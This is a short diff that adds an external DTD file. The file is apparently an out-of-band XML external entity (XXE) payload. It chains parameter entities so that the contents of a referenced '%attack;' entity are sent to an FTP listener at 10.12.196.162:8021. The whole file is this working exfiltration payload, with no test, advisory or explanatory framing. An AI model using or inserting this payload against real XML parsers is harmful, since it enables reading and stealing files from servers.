@@ -1,0 +1,7 @@
+<!ENTITY % shell "<!ENTITY &#x25; upload SYSTEM 'ftp://10.12.196.162:8021/%attack;
+'>">
+
+%shell;
+
+%upload;
+
